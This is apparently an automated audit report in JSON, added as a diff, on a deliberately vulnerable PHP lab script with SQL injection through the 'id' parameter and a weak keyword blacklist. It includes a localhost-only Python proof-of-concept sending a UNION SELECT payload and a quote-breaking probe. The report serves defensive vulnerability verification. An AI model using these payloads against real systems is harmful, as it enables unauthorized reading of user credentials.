@@ -1,0 +1,156 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-003",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["SQLI-003"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "输入、处理、危险操作与输出在给定片段内可完整追踪：第7行直接读取 $_GET['id']，第13行经黑名单（第40-41行仅删除 or/AND 子串），第16行在值位置以单引号字符串拼接构造 SQL，第17行 mysql_query 执行，第18-30行输出结果或 mysql_error。片段中未见参数化绑定、引号转义或数值白名单，故防护不足以阻断引号逃逸与 UNION/注释符向量。未提供连接文件与运行环境，故不升级为确认。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-003-F1",
+      "vulnerability_type": "SQL注入",
+      "locations": [
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 7,
+          "line_end": 7,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "$id= blacklist($id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 30,
+          "line_end": 30,
+          "quote": "print_r(mysql_error());"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 40,
+          "line_end": 40,
+          "quote": "$id= preg_replace('/or/i',\"\", $id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 44,
+          "line_end": 44,
+          "quote": "echo \"Hint: Your Input is Filtered with following result: \".$hint;"
+        }
+      ],
+      "data_flow": [
+        "第5-7行：入口条件 isset($_GET['id'])，$id 直接取自 GET 参数 id，无类型转换或长度限制。",
+        "第9-11行：$id 原值写入 result.txt 日志，仅记录不改变值（日志可能记录载荷）。",
+        "第13行调用 blacklist()，第40-41行仅用 preg_replace 删除 or 与 AND 子串（不区分大小写），未处理单引号、注释符、UNION、逗号、#、|| 等。",
+        "第16行：$id 被拼入单引号包裹的值位置，SQL 为 SELECT * FROM users WHERE id='$id' LIMIT 0,1，用户输入可闭合引号并附加 UNION SELECT 或注释符 -- 加空格。",
+        "第17行：mysql_query($sql) 执行拼接后的查询，参数化未使用，整个 WHERE 语义由 $id 决定。",
+        "第18-25行：命中行时输出 username 与 password；第29-30行未命中时 print_r(mysql_error()) 回显数据库错误。",
+        "第44行：$hint（过滤后的输入）回显在 Hint 文本后，可作为观察黑名单效果的对照点（同时构成输出注入风险）。",
+        "观察点：baseline id=1 返回真实用户名/密码；注入常量 UNION 使输出位置出现攻击者常量；语法错误路径出现 mysql 错误文本。"
+      ],
+      "principle": "用户可控的 id 值未经参数化或引号转义即按单引号字符串拼接进入 SQL 值位置，黑名单仅删除 or/AND 关键字，无法约束 SQL 结构；不使用 or/AND 的向量（如 1' UNION SELECT ...-- 加空格、闭合单引号）仍可改变查询语义。",
+      "impact": "可读取 users 表中用户名与口令（代码以明文输出 password 字段），可导致数据库信息泄露与登录态绕过；在具备堆叠/文件权限的数据库配置下影响可能扩大，但当前证据仅支持查询构造层面的越权读取。",
+      "preconditions": [
+        "本地授权靶场中该脚本可经 Web 访问，且 include 的 ../sql-connections/sql-connect.php 能完成 MySQL 连接。",
+        "运行环境提供 mysql_* 扩展（旧 PHP 或兼容层），否则 mysql_query 不会执行查询。",
+        "连接层或前置入口未对 id 做有效参数化/转义（给定片段中未见；需以连接文件补证）。",
+        "所用 payload 不含 or/AND 字母组合（如 UNON SELECT、注释符、hex 常量），以通过 preg_replace 黑名单。",
+        "若依赖 mysql_error 观察，需 display_errors/错误回显开启；否则以 UNION 常量回显或布尔差异作为观察点。"
+      ],
+      "counterexamples": [
+        "若 ../sql-connections/sql-connect.php 或上游入口对 id 使用预处理绑定，或按数据库字符集做有效的引号转义，则值无法逃逸。",
+        "若入口对 id 施加严格数值白名单（如 ctype_digit 且拒绝非数字），则注入路径不可达；给定片段中无该白名单。",
+        "若黑名单扩展为删除单引号、UNION、注释符且能证明无编码/大小写绕过，候选才可排除；当前仅删除 or/AND，不能排除。",
+        "若 mysql_query 因扩展缺失或连接失败而未执行 SQL，则查询语义改变不成立；这属环境限制，不能据此判定代码安全。",
+        "纯报错文本或 HTTP 200 不构成注入成功证据，需与对照组差异对应。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# SQLI-003 SQL injection HTTP verification draft (local authorized lab only).\n# Manual adaptation: set --path to the deployed SQLI-003.php location.\nimport argparse\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nMARKERS = ('Your Login name:', 'Your Password:', 'Please input the ID', 'Fatal error', 'Warning:', 'Hint: Your Input')\nLOCAL_HOSTS = ('127.0.0.1', 'localhost', '::1')\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef check_local(url):\n    parts = urllib.parse.urlsplit(url)\n    if parts.scheme not in ('http', 'https'):\n        raise SystemExit('unsupported scheme: ' + str(parts.scheme))\n    if parts.hostname not in LOCAL_HOSTS:\n        raise SystemExit('refusing non-local host: ' + str(parts.hostname))\n\n\ndef read_cookie(path):\n    if not path:\n        return None\n    with open(path, 'r', encoding='utf-8') as handle:\n        return handle.read().strip()\n\n\ndef fetch(opener, base_url, path, name, value, cookie, timeout):\n    query = urllib.parse.urlencode({name: value})\n    url = base_url.rstrip('/') + path + ('&' if '?' in path else '?') + query\n    check_local(url)\n    req = urllib.request.Request(url, headers={'User-Agent': 'sqli-003-audit-draft'})\n    if cookie:\n        req.add_header('Cookie', cookie)\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            body = resp.read().decode('utf-8', 'replace')\n            return {'status': resp.status, 'location': resp.headers.get('Location'), 'body': body}\n    except urllib.error.HTTPError as exc:\n        body = exc.read().decode('utf-8', 'replace')\n        return {'status': exc.code, 'location': exc.headers.get('Location'), 'body': body}\n    except urllib.error.URLError as exc:\n        print('transport error: ' + str(exc.reason))\n        return None\n\n\ndef report(name, resp, marker):\n    if resp is None:\n        print('[{}] transport failure (connection refused or timeout)'.format(name))\n        return False\n    body = resp['body']\n    print('[{}] http={} redirect={} bytes={}'.format(name, resp['status'], resp['location'], len(body)))\n    seen = [item for item in MARKERS if item in body]\n    if seen:\n        print('    markers: ' + ', '.join(seen))\n    else:\n        print('    markers: none')\n    hit = marker in body\n    print('    injected-marker {}: {}'.format(marker, 'PRESENT' if hit else 'absent'))\n    return hit\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='SQLI-003 id parameter SQL injection draft')\n    parser.add_argument('--base-url', default='http://127.0.0.1:8080')\n    parser.add_argument('--path', required=True, help='deployed path of SQLI-003.php, for example /sqli/SQLI-003.php')\n    parser.add_argument('--param', default='id', help='parameter name taken from code: id')\n    parser.add_argument('--cookie-file', default=None, help='optional local file holding a Cookie header value')\n    parser.add_argument('--timeout', type=float, default=10.0)\n    args = parser.parse_args()\n    cookie = read_cookie(args.cookie_file)\n    opener = urllib.request.build_opener(NoRedirect)\n    marker = 'SQLI003'\n    cases = [\n        ('baseline', '1'),\n        ('quote-error', \"1'\"),\n        ('union-marker', \"-1' UNION SELECT 1,0x53514c49303033,3-- -\"),\n    ]\n    hits = {}\n    for name, value in cases:\n        resp = fetch(opener, args.base_url, args.path, args.param, value, cookie, args.timeout)\n        hits[name] = report(name, resp, marker)\n    print('---')\n    print('baseline output look normal: ' + str(not hits.get('baseline')))\n    print('injected marker observed: ' + str(bool(hits.get('union-marker'))))\n    if hits.get('union-marker') and not hits.get('baseline'):\n        print('RESULT: marker constant echoed only with injected payload; review manually.')\n        return 0\n    print('RESULT: no clean differential; adjust column count, path or session and retry.')\n    return 1\n\n\nif __name__ == '__main__':\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库 argparse、urllib、sys）",
+          "无第三方库依赖",
+          "本地授权靶场中 SQLI-003.php 的可访问部署路径",
+          "可选：由命令行提供的本地 Cookie 文件（需会话时使用，不写入版本库）"
+        ],
+        "parameters": [
+          "--base-url（默认 http://127.0.0.1:8080，仅接受 localhost/127.0.0.1/::1）",
+          "--path（必填，SQLI-003.php 实际部署路径）",
+          "--param（默认 id，来自代码 $_GET['id']）",
+          "--cookie-file（可选，读取 Cookie 请求头，不打印内容）",
+          "--timeout（请求超时秒数，默认 10）"
+        ],
+        "steps": [
+          "确认 PHP/MySQL 版本、连接文件内容与目标部署路径，准备专用测试记录与 result.txt 原状备份。",
+          "运行 baseline：--param id 值为 1，记录 'Your Login name:' 后的用户名输出。",
+          "运行 quote-error：id 值为 1'，观察是否出现 mysql 语法错误文本，或结果为空但不出现用户名。",
+          "运行 union-marker：id 值为 -1' UNION SELECT 1,0x53514c49303033,3-- -，观察 'Your Login name:' 位置是否回显 SQLI003。",
+          "若响应报列数不匹配，按 SELECT * 的实际列数调整 UNION 常量个数后重试，并记录原始响应差异。",
+          "测试后回查 result.txt 中新增的测试记录并清理，保留对照响应原文供工作包4核验。"
+        ],
+        "expected_observation": "baseline 返回 'Your Login name:' 及真实用户名；quote-error 因引号逃逸导致语法错误（页面出现 mysql 错误文本，或空结果）；union-marker 使登录名位置回显常量字符串 SQLI003。三者使用同一本地会话、同一路径，且不自动跟随重定向。",
+        "success_criteria": "union-marker 响应在 'Your Login name:' 之后包含标记 SQLI003，而 baseline 与 quote-error 两种对照均不包含该标记；同时响应不是 302/303 登录跳转、不是 'Please input the ID as parameter' 分支、不是 PHP Fatal error 或缺少 mysql 扩展的接口错误。仅当对照差异一致时判定该路径注入成立；HTTP 200 或输入被回显本身不构成成功。",
+        "limitations": [
+          "草案，未运行（execution_status=未运行），不能据此声称已触发。",
+          "UNION 使用 3 个常量列，假设 users 表为 id/username/password 三列；实际列数不符时仅会出现列数错误，需人工调整。",
+          "仅回显常量标记，不枚举数据库、不读取额外敏感数据、不修改记录。",
+          "payload 不得包含 or/AND 字母组合（如 ORDER、PASSWORD、XOR），否则会被黑名单删除；password 列名直接写入 payload 不可行，故本草案不使用该列名。",
+          "脚本未保存独立文件（artifact_path=null），需人工保存后按目标环境适配路径与会话。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "include 的 ../sql-connections/sql-connect.php 未提供：字符集、sql_mode、是否对输入额外转义或重写 $_GET，以及 mysql 旧扩展兼容层实现未知。",
+    "PHP 与 MySQL/MariaDB 实际版本、magic_quotes_gpc 与 sql_mode（PIPES_AS_CONCAT、ANSI_QUOTES）未知。",
+    "部署路径、Web 服务器重写规则、认证与难度配置、result.txt 所在目录写权限未知。",
+    "users 表实际列数与列名未知（SELECT * 的列数决定 UNION 常量个数；代码仅直接读取 username/password）。",
+    "是否存在前置 WAF、IDS 或网关过滤，以及错误显示配置未知。",
+    "未提供任何运行记录或响应样本，无法确认实际触发结果与影响范围。"
+  ],
+  "risk_notes": [
+    "第44行将过滤后的 $hint 直接拼入 HTML 输出，存在反射型 XSS 风险，超出本次 SQL 注入范围。",
+    "第9-11行把原始 id 写入 result.txt，日志可能记录攻击载荷与测试数据。",
+    "第30行 print_r(mysql_error()) 向页面泄露数据库错误信息（信息泄露）。",
+    "fopen/fwrite 未检查返回值，result.txt 为相对路径，依赖进程工作目录。"
+  ],
+  "quality_notes": [
+    "mysql_* 系列函数在 PHP 7.0+ 已移除，该代码需旧版本或兼容扩展运行；这属于兼容性问题，不计作注入证据。",
+    "黑名单 preg_replace 删除 or/AND 子串会破坏正常输入（如 ORDER、PASSWORD、XOR 被改写），不是有效防护。",
+    "过滤仅覆盖 or/and 关键字，遗漏单引号、UNION、注释符、||、# 与堆叠查询等向量。",
+    "缺少对期望为数值的 id 的类型校验，缺乏参数化查询设计。"
+  ],
+  "limitations": [
+    "仅静态分析所提供的单个片段；未执行任何请求，verdict 保持待验证，不代表已确认或已排除。",
+    "连接文件未提供，若连接层存在有效参数化或引号转义，则第16行拼接路径的结论需重新评估。",
+    "POC 为本模型生成草案，未保存独立脚本文件，需人工适配路径与会话后运行；运行证据应由工作包4保存。",
+    "黑名单会删除 or/AND 子串，构造 payload 时需规避（本草案使用 UNION、hex 常量与注释符）。",
+    "父样本仅一个输入包，跨阶段存储/会话复用无额外数据；本判定不涉及第二阶段注入。"
+  ],
+  "runtime_evidence": []
+}
